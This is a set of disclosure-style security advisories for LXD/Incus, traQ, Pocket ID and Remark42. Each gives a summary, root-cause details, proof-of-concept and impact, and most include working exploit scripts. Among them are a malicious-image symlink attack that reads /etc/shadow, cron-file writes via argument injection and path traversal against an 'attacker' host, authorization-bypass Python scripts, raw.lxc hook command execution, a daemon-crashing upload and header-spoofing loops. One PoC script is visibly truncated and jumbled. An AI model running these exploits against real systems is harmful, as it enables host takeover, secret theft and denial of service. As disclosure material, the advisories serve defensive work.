summary: LXD has arbitrary file read+write on host via rootfs/ symlink in malicious image
details:
Reported from https://github.com/lxc/incus/security/advisories/GHSA-2q3f-q5pq-g8wv

### Summary

A specially crafted image can be used to read or create/write arbitrary files on the host; possibly leading to arbitrary command execution.


### Details

Incus validates an image as soon as it sees a normal `metadata.yaml` and
a `rootfs/` entry, but full extraction can later process a duplicate top-level
`rootfs` symlink. Later, the stopped-container file API opens
`d.RootfsPath()` and passes that file descriptor to `forkfile`, which chroots to
it.

```
metadata.yaml
rootfs/
rootfs -> /
```

In practice, this allows a malicious actor to access the host's filesystem
with root privileges.


### PoC

Below, we map the container's rootfs to `/` on the host, but it can be
mapped anywhere. We then retrieve the host's `/etc/shadow` file and
create a file in `/`.

```
#!/bin/sh
set -eu

tmpdir=$(mktemp -d)
cleanup() {
    rm -rf "${tmpdir}"
}
trap cleanup EXIT INT QUIT TERM HUP

mkdir -p "${tmpdir}/img/rootfs"
cat<<__EOF__>"${tmpdir}/img/metadata.yaml"
architecture: x86_64
creation_date: 1
properties:
  description: PoC rootfs symlink host afrw
__EOF__

cd "${tmpdir}/img"
tar --owner=0 --group=0 -f- -c * >../afrw-rootfs-symlink.tar

# inject rootfs symlink
rmdir rootfs
ln -s / rootfs
tar --owner=0 --group=0 -f ../afrw-rootfs-symlink.tar --append rootfs


incus image import ../afrw-rootfs-symlink.tar --alias afrw-rootfs-symlink
incus init afrw-rootfs-symlink afrw-rootfs-symlink


# read
incus file pull afrw-rootfs-symlink/etc/shadow "${tmpdir}/shadow"
cat "${tmpdir}/shadow"

# write
printf 'afrw-rootfs-symlink\n' >"${tmpdir}/afrw-rootfs-symlink"
incus file push "${tmpdir}/afrw-rootfs-symlink" afrw-rootfs-symlink/
```

### Impact

Arbitrary file read and write on the host via unsanitized symlink;
possibly leading to command execution.

summary: LXD has argument injection in backup compression algorithm leading to AFW and ACE
details:
Reported from  https://github.com/lxc/incus/security/advisories/GHSA-v6mj-8pf4-hhw4

### Summary

Improper validation of user-provided backup compression algorithm leads to
argument injection in the constructed command line. This leads to an
arbitrary file write on the host, possibly leading to arbitrary command
execution.


### Details

Incus validates `compression_algorithm` by parsing it into fields and checking
only the first token against an allowlist:

```go
fields, err := shellquote.Split(value)
...
if !slices.Contains([]string{"bzip2", "gzip", "lz4", "lzma", "pigz", "pzstd", "pxz", "tar2sqfs", "xz", "zstd"}, fields[0]) {
    return fmt.Errorf("Compression algorithm %q isn't currently supported", fields[0])
}
_, err = exec.LookPath(fields[0])
```

Extra arguments are not rejected. `compressFile()` then prepends `-c` and
passes the remaining user-supplied fields to the compressor:

```go
args := []string{"-c"}
if len(fields) > 1 {
    args = append(args, fields[1:]...)
}
cmd := exec.Command(fields[0], args...)
cmd.Stdin = infile
cmd.Stdout = outfile
```

With a value like:

```text
zstd -d -f --pass-through -o /etc/cron.d/incus-zstd-rce -- /var/lib/incus/.../payload
```

the daemon executes the equivalent of:

```text
zstd -c -d -f --pass-through -o /etc/cron.d/incus-zstd-rce -- /var/lib/incus/.../payload
```

### PoC

```
python3 poc.py \
	--insecure --url https://remote-incus:8443 \
	--cert ~/.config/incus/client.crt --key ~/.config/incus/client.key \
	--instance c01 \
	--execute --yes-i-understand-this-writes-host-file
```

summary: LXD has arbitrary file write on client due to trusted image hash
details:
Reported from https://github.com/lxc/incus/security/advisories/GHSA-f6m5-xw2g-xc4x

### Summary

An arbitrary file write exists in the Incus client when a malicious image
server returns a crafted `Incus-Image-Hash` header. This can lead to
arbitrary command execution as root on the server.


### Details

- `cmd/incusd/images.go:611-684` handles `source.type=url` by HEADing the user-supplied URL, reading `Incus-Image-Hash` and `Incus-Image-URL`, and passing them to `imageDownload()` as `Alias`
 and `Server`.
- `cmd/incusd/daemon_images.go:91-92` defaults `fp` to the caller-controlled alias string.
- `cmd/incusd/daemon_images.go:333-335` builds `destName := filepath.Join(destDir, fp)`.
- `cmd/incusd/daemon_images.go:469-523` enters the `direct` protocol branch, opens `destName` with `os.Create()`, and copies the HTTP response into that file.
- `cmd/incusd/daemon_images.go:528-532` validates the SHA-256 only after the file has already been created and populated.
- `cmd/incusd/daemon_images.go:337-344` cleanup only runs after the copy returns; a slow or held response extends the arbitrary-write window.

A malicious image server returning something along the following will cause
the arbitrary file write.

```
Incus-Image-Hash: ../../../../etc/cron.d/incus-direct-image-url-rce
Incus-Image-URL: http://attacker/payload
```


### PoC

The script below creates a malicious image server and requests an Incus
server to fetch the image. File write occurs when the image is unpacked.

the `Incus-Image-Hash` header as the expected fingerprint. The direct download
path then creates `/var/lib/incus/images/<hash>` before validating that the hash
is a real SHA-256 of the downloaded bytes. A hash containing `../` escapes the
image directory.

Default mode is dry-run. With --execute-trigger this script starts a tiny HTTP
server, returns a traversal hash pointing at cron, streams the cron payload, and
keeps the response open so the daemon-side cleanup does not immediately remove
the file.

import http.client
import json
import shlex

import ssl
import sys

import time
import urllib.parse

from typing import Any

DEFAULT_TRAVERSAL = "../../../../etc/cron.d/incus-direct-image-url-rce"


class UnixHTTPConnection(http.client.HTTPConnection):
    def __init__(self, socket_path: str, timeout: int = 120):
        super().__init__("incus", timeout=timeout)
        self.socket_path = socket_path

    def connect(self) -> None:
        sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        sock.settimeout(self.timeout)
        sock.connect(self.socket_path)
        self.sock = sock


class RCEHTTPServer(ThreadingHTTPServer):
    hash_path: str
    advertise_url: str
    payload: bytes
    hold_seconds: int
    payload_requested: threading.Event


class DirectImageHandler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"
    server_version = "direct-image-rce/1.0"

    def log_message(self, fmt: str, *args: Any) -> None:
        print(f"[http] {self.address_string()} - {fmt % args}", flush=True)

    def do_HEAD(self) -> None:
        if self.path != "/stage":
            self.send_error(404)
            return

        srv = self.server
        assert isinstance(srv, RCEHTTPServer)
        self.send_response(200)
        self.send_header("Incus-Image-Hash", srv.hash_path)
        self.send_header("Incus-Image-URL", srv.advertise_url.rstrip("/") + "/payload")
        self.send_header("Connection", "close")
        self.end_headers()

    def do_GET(self) -> None:
        if self.path != "/payload":
            self.send_error(404)
            return

        srv = self.server
        assert isinstance(srv, RCEHTTPServer)
        srv.payload_requested.set()

        self.send_response(200)
        self.send_header("Content-Type", "application/octet-stream")
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(srv.payload)
        self.wfile.flush()
        print(f"[*] payload bytes written to daemon response; holding for {srv.hold_seconds}s", flush=True)

    if args.url:

    parser.add_argument("--socket", default=DEFAULT_SOCKET, help="Incus Unix socket")

    print(f"[*] HEAD URL served to daemon: {args.advertise_url.rstrip()}/stage")
    print(f"[*] returned Incus-Image-Hash: {args.hash_path}")
    print(f"[*] returned Incus-Image-URL: {args.advertise_url.rstrip()}/payload")

summary: LXD has CreateCustomVolumeFromBackup nil-pointer dereference on volumes[0].snapshots[*].expires_at
details:
## Summary

(sibling-field variant of CVE-2026-40197 fix 05bc272)

`(*lxdBackend).CreateCustomVolumeFromBackup` in [`lxd/storage/backend_lxd.go`](https://github.com/canonical/lxd/blob/05bc272/lxd/storage/backend_lxd.go) contains an unguarded `*time.Time` dereference on the `ExpiresAt` field of every volume-snapshot entry in an imported custom-volume backup. An authenticated user with `EntitlementCanCreateStorageVolumes` permission on any project can crash the `lxd` daemon by uploading a backup tarball whose `volumes[0].snapshots[*].expires_at` field is omitted.

This is a sibling-field variant of the CVE-2026-40197 fix (commit `05bc272`, "Validate snapshots from backup.yaml are non-nil", cherry-picked from incus commit `985a1dedf` / GHSA-r7w7-mmxr-47r9). That fix added `if snap == nil` guards at several consumer sites, but did not guard the adjacent `*snapshot.ExpiresAt` deref at line 8216. Every other consumer of this field in the same file already gates the deref with `if … != nil` (e.g. lines 1010-1011, 1274-1275, 1856-1857, 2454-2455, 5070-5071, 5527-5528). Asymmetric guard is the bug.

## Vulnerable code

[`lxd/storage/backend_lxd.go`](https://github.com/canonical/lxd/blob/05bc272/lxd/storage/backend_lxd.go), `CreateCustomVolumeFromBackup`:

```go
// Line 8141-8150 — earliest snapshot validation pass (caches s == nil)
for i, snap := range customVol.Snapshots {
    if snap == nil {
        return fmt.Errorf("Nil custom volume snapshot definition found at index %d", i)
    }
    err = drivers.ValidVolumeName(snap.Name)
    ...
}

// Line 8196-8216 — the snapshot DB-create loop
for i, s := range customVol.Snapshots {
    if s == nil {
        return fmt.Errorf("Nil custom volume snapshot definition found at index %d", i)
    }
    snapshot := s
    ...
    // Line 8216 — UNGUARDED *time.Time deref:
    err = VolumeDBCreate(b, srcBackup.Project, fullSnapName, snapshot.Description,
        snapVol.Type(), true, snapVol.Config(), snapshot.CreatedAt,
        *snapshot.ExpiresAt,           // <-- panics when expires_at omitted in YAML
        snapVol.ContentType(), true, true)
```

`ExpiresAt` is declared `*time.Time` ([`shared/api/storage_pool_volume_snapshot.go`](https://github.com/canonical/lxd/blob/05bc272/shared/api/storage_pool_volume_snapshot.go)). Every other consumer in the same file already uses the safe pattern (`if … != nil { … = *… }`):

| Line | Code | Guarded? |
|------|------|----------|
| 1010-1011 | rootVol.Snapshots[i].ExpiresAt | YES |
| 1274-1275 | rootVol.Snapshots[i].ExpiresAt | YES |
| 1558-1559 | srcSnap.ExpiresAt | YES |
| 1856-1857 | rootVol.Snapshots[i].ExpiresAt | YES |
| 2454-2455 | rootVol.Snapshots[i].ExpiresAt | YES |
| 5070-5071 | customVol.Snapshots[i].ExpiresAt | YES |
| 5527-5528 | srcSnap.ExpiresAt | YES |
| **8216** | **CreateCustomVolumeFromBackup snapshot.ExpiresAt** | **NO** |

## Reach

1. Attacker is an authenticated client (TLS cert, OIDC, or unix socket) with the `EntitlementCanCreateStorageVolumes` entitlement on any project. Same auth gate as CVE-2026-40197.
2. `POST /1.0/storage-pools/<pool>/volumes/custom` with `Content-Type: application/octet-stream` and `X-LXD-name: <name>`.
3. Body is a tar containing [`backup/index.yaml`](https://github.com/canonical/lxd/blob/05bc272/backup/index.yaml) with `type: custom`, `volumes[0]` non-nil, and `volumes[0].snapshots[0]` non-nil but missing `expires_at`.
4. `lxd/storage_volumes.go:storagePoolVolumesPost` -> `backup.GetInfo` parses the yaml -> `pool.CreateCustomVolumeFromBackup` -> the validations at 8141-8150 + 8197 pass (snapshot pointer is non-nil, name is valid) -> `*snapshot.ExpiresAt` on line 8216 panics on the nil `*time.Time`.
5. The Go runtime kills the entire `lxd` daemon process. Repeated POSTs are a persistent denial of service.

Minimal [`backup/index.yaml`](https://github.com/canonical/lxd/blob/05bc272/backup/index.yaml):

```yaml
name: poc-vol
backend: dir
pool: default
type: custom
optimized: false
optimized_header: false
snapshots: [snap0]
config:
  version: 2
  pools:
    - {name: default, driver: dir, config: {}}
  volumes:
    - name: poc-vol
      type: custom
      pool: default
      content_type: filesystem
      config: {}
      snapshots:
        - name: snap0
          description: snap0
          config: {}
          # expires_at intentionally omitted
```

## Proof of concept (end-to-end against running daemon)

Bundled in the report: `make_backup.sh` + the resulting 516-byte `poc-vol-lxd.tar.gz`.

Tested against `lxd 6.8` (HEAD of `canonical/lxd` at the time of testing, built from source with `make deps && go build -tags libsqlite3 ./lxd`). Daemon started with default `dir` storage pool.

```bash
$ curl -s --unix-socket /var/lib/lxd/unix.socket -X POST \
    --data-binary @/tmp/poc-vol-lxd.tar.gz \
    -H 'Content-Type: application/octet-stream' \
    -H 'X-LXD-name: poc-vol' \
    http://lxd/1.0/storage-pools/default/volumes/custom
{"type":"async","status":"Operation created","status_code":100,...}

$ ps -ef | grep lxd | grep -v grep    # daemon GONE
```

Daemon panic from `/tmp/lxd.out`:

```
panic: runtime error: invalid memory address or nil pointer dereference
[signal SIGSEGV: segmentation violation code=0x1 addr=0x0 pc=0x11015e8]

goroutine 683 [running]:
github.com/canonical/lxd/lxd/storage.(*lxdBackend).CreateCustomVolumeFromBackup(...)
    github.com/canonical/lxd/lxd/storage/backend_lxd.go:8216 +0xf58
main.createStoragePoolVolumeFromBackup.func6(...)
    github.com/canonical/lxd/lxd/storage_volumes.go:2879 +0x2a0
github.com/canonical/lxd/lxd/operations.(*Operation).start.func1(...)
    github.com/canonical/lxd/lxd/operations/operations.go:588 +0x6c
created by github.com/canonical/lxd/lxd/operations.(*Operation).start in goroutine 655
    github.com/canonical/lxd/lxd/operations/operations.go:541 +0x2b8
```

Stack frame [`backend_lxd.go:8216`](https://github.com/canonical/lxd/blob/05bc272/backend_lxd.go#L8216) is the literal `*snapshot.ExpiresAt` line.

## Impact

- **Severity:** denial of service against the entire `lxd` daemon process. Every container / VM / storage operation on the host (and on the cluster member, if clustered) is aborted; subsequent requests fail until an operator restarts the process.
- **Privileges required:** any authenticated user with `can_create_storage_volumes` on any project. Not behind the admin tier.
- **Network attack surface:** the LXD REST API on `:8443` or the unix socket.
- **CWE-476** — Nil-Pointer Dereference. **CVSS estimate:** 6.5 (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H).
- **Versions:** confirmed at `lxd 6.8` (HEAD); the same code exists in the v5.21 LTS line as the parent fix `05bc272` was a cherry-pick from incus.

## Suggested fix

Mirror the guard pattern already in use elsewhere in this file:

```diff
--- a/lxd/storage/backend_lxd.go
+++ b/lxd/storage/backend_lxd.go
@@ -8210,9 +8210,14 @@ func (b *lxdBackend) CreateCustomVolumeFromBackup(...) error {
         snapVolStorageName := project.StorageVolume(srcBackup.Project, fullSnapName)
         snapVol := b.GetNewVolume(drivers.VolumeTypeCustom, drivers.ContentType(customVol.ContentType), snapVolStorageName, snapshot.Config)

         // Validate config and create database entry for new storage volume.
         // Strip unsupported config keys (in case the export was made from a different type of storage pool).
-        err = VolumeDBCreate(b, srcBackup.Project, fullSnapName, snapshot.Description, snapVol.Type(), true, snapVol.Config(), snapshot.CreatedAt, *snapshot.ExpiresAt, snapVol.ContentType(), true, true)
+        var snapExpiryDate time.Time
+        if snapshot.ExpiresAt != nil {
+            snapExpiryDate = *snapshot.ExpiresAt
+        }
+
+        err = VolumeDBCreate(b, srcBackup.Project, fullSnapName, snapshot.Description, snapVol.Type(), true, snapVol.Config(), snapshot.CreatedAt, snapExpiryDate, snapVol.ContentType(), true, true)
         if err != nil {
             return err
         }
```

## Related advisories

- `GHSA-r7w7-mmxr-47r9` (CVE-2026-40197) / commit `05bc272` (cherry-pick of incus `985a1dedf`) — parent fix: added `s == nil` checks at multiple consumer sites, missed the `*snapshot.ExpiresAt` deref at line 8216.
- `lxc/incus GHSA-xhqx-mgh3-3h7q` (sibling report filed by same reporter against the upstream-equivalent line [`internal/server/storage/backend.go:7731`](https://github.com/canonical/lxd/blob/05bc272/internal/server/storage/backend.go#L7731) in incus).

The shape is "incomplete fix on a sibling field of the same struct" — the maintainer walked nil-checks for the iteration-variable pointer but did not walk every adjacent pointer field that the loop body still dereferences.

## Reporter notes

Reported via Privately-Reported Vulnerability against `canonical/lxd` by tonghuaroot.

summary: LXD has project restriction bypass in instance copy across projects
details:
Reported from https://github.com/lxc/incus/security/advisories/GHSA-c9f5-j9c3-mhrg

### Summary
Missing authorization checks exist for instance copying where an attacker knowing the name of a project that they don't have access to and the name of an instance in that project can copy the instance to a new project. This issue could allow an attacker to access secrets in instances they are not authorized to access.

### Details
`cmd/incusd/instances.go` authorizes `POST /1.0/instances` against the target project. In the copy path, `cmd/incusd/instances_post.go` then loads the source instance from `req.Source.Project` without checking whether the caller can view that source instance.

From my understanding, the copy must occur on the same server. However, once the copy has been done, nothing prevents a malicious actor from moving the instance to another server.

### PoC

#### Setup

We assume the target server is remotely accessible and a user/certificate has been added.

```
# create a new project and instance
incus project create secrets
incus profile show default | incus --project secrets edit default
incus --project secrets init images:debian/trixie secret

# restrict an existing certificate to prevent access to the project
incus config trust edit cert-fp
#> set, for example
restricted: true
projects:
  - default

# verification, with the restricted certificate
incus ls remote:
```

#### Exploitation

The below script was partly generated. To copy the `secret` instance to the `default` project, the following command can be used.

```
python3 poc.py --url https://IP-REMOTE:8443 \
    --cert path/to/client.crt --key path/to/client.key \
    --target-project default --source-project secrets \
    --source-instance secret --name copy-secret --insecure
```

Wait a bit for the instance to be copied, then `incus ls remote:` to see the copied instance.

```
#!/usr/bin/env python3
"""Copy an instance from a project the caller should not be able to read."""

from __future__ import annotations

import argparse
import json
import ssl
import sys
import urllib.error
import urllib.parse
import urllib.request


def post(url: str, path: str, body: dict, cert: str, key: str, insecure: bool) -> bytes:
    ctx = ssl.create_default_context()
    if insecure:
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    ctx.load_cert_chain(cert, key)

    req = urllib.request.Request(
        url.rstrip("/") + path,
        data=json.dumps(body).encode(),
        method="POST",
        headers={"Content-Type": "application/json", "Accept": "application/json"},
    )
    try:
        with urllib.request.urlopen(req, context=ctx) as resp:
            return resp.read()
    except urllib.error.HTTPError as exc:
        sys.stderr.write(exc.read().decode(errors="replace") + "\n")
        raise


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", required=True)
    ap.add_argument("--cert", required=True)
    ap.add_argument("--key", required=True)
    ap.add_argument("--target-project", required=True)
    ap.add_argument("--source-project", required=True)
    ap.add_argument("--source-instance", required=True)
    ap.add_argument("--name", required=True, help="new instance name in target project")
    ap.add_argument("--instance-only", action="store_true")
    ap.add_argument("--start", action="store_true")
    ap.add_argument("--insecure", action="store_true")
    ap.add_argument("--dry-run", action="store_true")
    args = ap.parse_args()

    body = {
        "name": args.name,
        "source": {
            "type": "copy",
            "source": args.source_instance,
            "project": args.source_project,
            "instance_only": args.instance_only,
        },
        "start": args.start,
    }
    path = "/1.0/instances?" + urllib.parse.urlencode({"project": args.target_project})
    print(json.dumps(body, indent=2))
    if args.dry_run:
        return 0
    print(post(args.url, path, body, args.cert, args.key, args.insecure).decode(errors="replace"))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
```

### Impact

An attacker can copy instances they don't normally have access to, possibly leading to information disclosure.

summary: LXD has project restriction bypass for custom volume copy across projects
details:
Reported from https://github.com/lxc/incus/security/advisories/GHSA-64f3-v33m-w89f

### Summary

Missing authorization checks exist for custom volume copying where an attacker knowing the name of a project that they don't have access to and the name of a custom volume in that project can copy the custom volume to a new project. This issue could allow an attacker to access secrets in custom volumes they are not authorized to access.

### Details

The storage volume creation handler authorizes creation in the target project, then passes `req.Source.Project` into the custom-volume copy path without checking that the caller can view the source volume. `req.Source.Project` is the attacker-controlled field. It is resolved to a storage volume project name and passed directly to `CreateCustomVolumeFromCopy`. No `allowPermission` or entitlement check (e.g. `CanView` on the source volume) is performed.

From my understanding, the copy must occur on the same server. However, once the copy has been done, nothing prevents a malicious actor from moving the volume to another server.

### PoC
#### Setup

We assume the target server is remotely accessible and a user/certificate has been added.

```
# create a new project and instance
incus project create secrets
incus profile show default | incus --project secrets edit default
incus --project secrets storage volume create default secret-vol

# restrict an existing certificate to prevent access to the project
incus config trust edit cert-fp
#> set, for example
restricted: true
projects:
  - default

# verification, with the restricted certificate
incus --project secrets storage volume ls remote:default
```

#### Exploitation

The below script was partly generated. To copy the secret instance to the default project, the following command can be used.

```
python3 poc.py --url https://IP-REMOTE:8443 \
    --cert path/to/client.crt --key path/to/client.key \
    --target-project default --source-project secrets \
    --source-volume secret-vol --name copy-secret-vol \
    --pool default --source-pool default \
    --insecure
```

Wait a bit for the custom volume to be copied, then `incus storage volume ls remote:default` to see the copied instance.

```
#!/usr/bin/env python3
"""Copy a custom storage volume from another project into an allowed project."""

from __future__ import annotations

import argparse
import json
import ssl
import sys
import urllib.error
import urllib.parse
import urllib.request


def post(url: str, path: str, body: dict, cert: str, key: str, insecure: bool) -> bytes:
    ctx = ssl.create_default_context()
    if insecure:
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
    ctx.load_cert_chain(cert, key)
    req = urllib.request.Request(
        url.rstrip("/") + path,
        data=json.dumps(body).encode(),
        method="POST",
        headers={"Content-Type": "application/json", "Accept": "application/json"},
    )
    try:
        with urllib.request.urlopen(req, context=ctx) as resp:
            return resp.read()
    except urllib.error.HTTPError as exc:
        sys.stderr.write(exc.read().decode(errors="replace") + "\n")
        raise


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", required=True)
    ap.add_argument("--cert", required=True)
    ap.add_argument("--key", required=True)
    ap.add_argument("--pool", required=True)
    ap.add_argument("--target-project", required=True)
    ap.add_argument("--source-project", required=True)
    ap.add_argument("--source-volume", required=True)
    ap.add_argument("--source-pool")
    ap.add_argument("--name", required=True, help="new volume name in target project")
    ap.add_argument("--content-type", default="filesystem", choices=["filesystem", "block"])
    ap.add_argument("--volume-only", action="store_true")
    ap.add_argument("--insecure", action="store_true")
    ap.add_argument("--dry-run", action="store_true")
    args = ap.parse_args()

    source = {
        "type": "copy",
        "name": args.source_volume,
        "project": args.source_project,
        "volume_only": args.volume_only,
    }
    if args.source_pool:
        source["pool"] = args.source_pool

    body = {
        "name": args.name,
        "type": "custom",
        "content_type": args.content_type,
        "source": source,
    }
    path = "/1.0/storage-pools/{}/volumes/custom?{}".format(
        urllib.parse.quote(args.pool, safe=""),
        urllib.parse.urlencode({"project": args.target_project}),
    )
    print(json.dumps(body, indent=2))
    if args.dry_run:
        return 0
    print(post(args.url, path, body, args.cert, args.key, args.insecure).decode(errors="replace"))
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
```

### Impact

An attacker can copy instances they don't normally have access to, possibly leading to information disclosure.

summary: LXD has restricted project bypass leading to arbitrary command execution
details:
Reported from https://github.com/lxc/incus/security/advisories/GHSA-48q5-w887-33wv

### Summary

Instance snapshots ignore the `restricted.containers.lowlevel=block` setting;
allowing for arbitrary command execution on the Incus server by abusing
lowlevel hooks such as `raw.lxc` and `raw.qemu`.


### Details

Instance snapshots ignore the `restricted.containers.lowlevel=block` setting;
allowing for arbitrary command execution on the Incus server by abusing
lowlevel hooks such as `raw.lxc` and `raw.qemu`.

As snapshots can be moved from one server to another, a malicious
instance+snapshot can be crafted locally, moved to a restricted project
and the snapshot restored for arbitrary command execution.

In practice, this allows a malicious actor to execute arbitrary commands
on the host with root privileges.


### PoC

```
# remote, restricted
incus project set rem:project restricted.true
incus project set rem:project restricted.containers.lowlevel=block

# locally, unrestricted project
incus init images:debian/trixie rce-raw-lxc
incus config set rce-raw-lxc raw.lxc='lxc.hook.pre-start = /bin/sh -c "/bin/id >/lxc-hook-prestart"'
incus snapshot create rce-raw-lxc snap0
#> allow transfer to restricted project
incus config unset rce-raw-lxc raw.lxc

# locally, transfer and trigger
incus move rce-raw-lxc rem: --mode push
incus snapshot restore rem:rce-raw-lxc snap0
incus start rem:rce-raw-lxc
```


### Impact

- Bypass of project restrictions.
- Arbitrary command execution on the Incus server.

summary: traQ: XSS in the User Uploaded File Retrieval API
details:
### Impact

For instances where `TRAQ_STORAGE_TYPE` is set to `local`, the file retrieval API `/files/{fileId}` could serve user-uploaded SVG or HTML files in a way that allowed them to be rendered directly in the browser.

As a result, an attacker who can upload files to traQ could upload a crafted SVG or HTML file and trick a victim into opening the file URL, allowing the attacker to execute arbitrary JavaScript in the victim's browser.

### Patches

This issue has been fixed in v3.28.3.

After this fix, the file retrieval API always adds the `Content-Disposition` header to its responses regardless of the value of the `dl` query parameter. This prevents user-uploaded files from being displayed directly in the browser.

### Workarounds

To mitigate the impact of this issue, apply either of the following workarounds:

* Change `TRAQ_STORAGE_TYPE` to a storage backend other than `local`.
* Ensure that all requests to `/files/{fileId}` include `dl=1`.

Users of this application can reduce the risk of exploitation by avoiding suspicious file URLs.

summary: traQ: Privilege escalation by OAuth prompt=none request
details:
In OAuth2 silent authorization (`prompt=none`), when the `scope` parameter was empty or omitted, all scopes registered for the OAuth client became eligible for issuance. However, the prior consent check was performed against the empty requested scope set. As a result, an attacker could obtain an access token with broader scopes than the user had previously consented to, without requiring additional consent.

## Impact

If an attacker controls an OAuth client capable of receiving authorization codes, and a user has already consented to only a subset of that client’s scopes, the attacker may be able to obtain a token containing all scopes registered for that client by sending an authorization request with `prompt=none` and an empty or omitted `scope`.

If the user has not consented to the client at all, `consent_required` is returned as usual.

## Patches

This issue has been fixed in v3.28.3. After the fix, the consent check for `prompt=none` verifies the scopes that will actually be issued, rather than the empty requested scope set. If the user has not consented to all scopes after expansion, `consent_required` is returned.

traQ also recommends revoking any existing OAuth tokens created before the fix if they were potentially affected.

## Workarounds

If users cannot update immediately, they should apply the following mitigations:

- Disable untrusted OAuth clients, minimize registered client scopes, and revoke existing tokens
- Reject authorization requests with `prompt=none` where `scope` is empty or omitted

summary: Pocket ID: The client credentials grant allows any OIDC client to obtain tokens for arbitrary audiences
details:
## Summary

The client credentials grant (`grant_type=client_credentials`) does not validate the resource parameter before embedding it as the aud claim in the issued JWT. Any authenticated OIDC client can obtain a Pocket ID-signed access token claiming authorization for any arbitrary audience, including other registered OIDC clients. There is no check that the requested audience is a registered resource server, and no check that the requesting client has been granted permission to access it.

## Details

In `backend/internal/service/oidc_service.go`, `createTokenFromClientCredentials` accepts the resource parameter from the token request and places it directly into the `aud` claim of the issued JWT without validation:

```golang
  audClaim := client.ID
  if input.Resource != "" {
      audClaim = input.Resource  // no validation performed
  }
  accessToken, err := s.jwtService.GenerateOAuthAccessToken(dummyUser, audClaim)
```

The only guard in this function is `verifyClientCredentialsInternal`, which confirms the requesting client's credentials are valid. After that check passes, any value supplied as resource is accepted. There is no registry of permitted audiences, no per-client authorization policy controlling which resources a client may request tokens for, and no validation that the resource value corresponds to anything registered in Pocket ID.

The introspection endpoint (`/api/oidc/introspect`) does not mitigate this. It checks that the introspecting client's ID matches the token's `aud` claim, but since the attacker controls `aud`, a resource server calling introspection to validate an inbound token will receive `"active": true`. Pocket ID has no server-side record of which client requested the token or whether it was authorized to do so, so introspection cannot distinguish a legitimately issued token from one obtained through this vulnerability.

## PoC

Given a Pocket ID instance with two registered OIDC clients — `client-a` (attacker-controlled) and `client-b` (target resource) — the following request causes Pocket ID to issue a signed JWT with `aud: ["client-b"]`, authenticated only as `client-a`:

```
curl -X POST https://<pocket-id-host>/api/oidc/token \
    -d "grant_type=client_credentials" \
    -d "client_id=client-a" \
    -d "client_secret=<client-a-secret>" \
    -d "resource=client-b"
```

The response is a valid, Pocket ID-signed JWT with:

```json
{
    "sub": "client-client-a",
    "aud": ["client-b"],
    "iss": "https://<pocket-id-host>",
    "type": "oauth-access-token"
}
```

This token will pass signature and `aud` validation at any resource server that trusts Pocket ID's JWKS and accepts `client-b` as its audience identifier.

## Impact

Any OIDC client registered in Pocket ID that has valid credentials (client secret or federated identity) can obtain a Pocket ID-signed access token scoped to any other registered client or arbitrary audience string. In deployments where services use the client credentials grant and validate incoming bearer tokens against Pocket ID's JWKS, this allows a compromised or malicious client to bypass audience-based access controls and present tokens to resource servers it should not be authorized to access.

The severity depends on deployment: if no resource servers validate Pocket ID-issued access tokens, there is no immediate exploitable impact. In deployments that do rely on the client credentials grant for service-to-service authorization, the isolation between services is entirely broken.

summary: Remark42: Rate limit bypass via unconditional trust of X-Forwarded-For/X-Real-IP headers in direct-internet deployment
details:
### Summary
Remark42 applied chi's `middleware.RealIP` globally, trusting `True-Client-IP` / `X-Real-IP` / `X-Forwarded-For` headers without verifying the request came from a trusted proxy. The per-IP rate limiters key on the overwritten `r.RemoteAddr`, so any client can bypass every per-IP rate limiter by rotating spoofed IP headers. The same spoofed IP also drives other per-IP controls (stored comment IP, anonymous identity derivation, and `--votes-ip` vote de-duplication). This affects deployments reachable directly from the internet (Remark42's built-in HTTP, static TLS, and ACME modes are all documented and supported), as well as any proxied deployment where the proxy forwards an attacker-controlled recognised header.

### Details
The router applies `middleware.RealIP` globally, ahead of the per-route limiters, without any check that the server is behind a trusted proxy (in v1.16.1, `backend/app/rest/api/rest.go:207`).

The `rateLimiter` function (v1.16.1, `backend/app/rest/api/rest.go:769-779`) builds a tollbooth limiter with `IPLookup{Name: "RemoteAddr"}`, which reads `r.RemoteAddr`. Since chi's `middleware.RealIP` (v1.16.1, `backend/vendor/github.com/go-chi/chi/v5/middleware/realip.go:42-55`) unconditionally overwrites `r.RemoteAddr` from `True-Client-IP > X-Real-IP > first X-Forwarded-For` (accepting any syntactically valid IP), any client can set its apparent IP to an arbitrary value.

This bypasses every per-IP rate limiter that runs after `RealIP`: `/auth` (2/s), avatars (100/s), the image proxy (10/s), open / protected / admin route groups (10/s), root routes (50/s), and `/web/*` (20/s). Comment and vote creation go through the update limiter, whose server default is `UPDATE_LIMIT=0.5`/s (burst 1), not 10/s. The global 1,000 concurrent-request throttle still applies, so this is a per-IP-limit bypass rather than truly unlimited throughput. chi's own documentation warns that `middleware.RealIP` should be used only behind a trusted proxy.

### PoC
```bash
# Deploy Remark42 reachable directly from the internet (built-in HTTP / TLS / ACME, no proxy that overwrites the headers).
# Comment creation is limited to UPDATE_LIMIT (default 0.5/s, burst 1) per IP.

# Rotate X-Real-IP across many requests; each distinct value gets its own token bucket.
for i in $(seq 1 100); do
  curl -s -o /dev/null -w '%{http_code}\n' \
    -H "X-Real-IP: 192.0.2.$i" \
    -X POST 'https://remark42.example.com/api/v1/comment?site=site1' \
    -H 'Authorization: Bearer YOUR_JWT' \
    -H 'Content-Type: application/json' \
    -d '{"text":"spam","locator":{"site":"site1","url":"https://example.com/post"}}'
done | sort | uniq -c
# With rotating headers the responses stay 201; without them, requests beyond the burst return 429.
```

### Impact
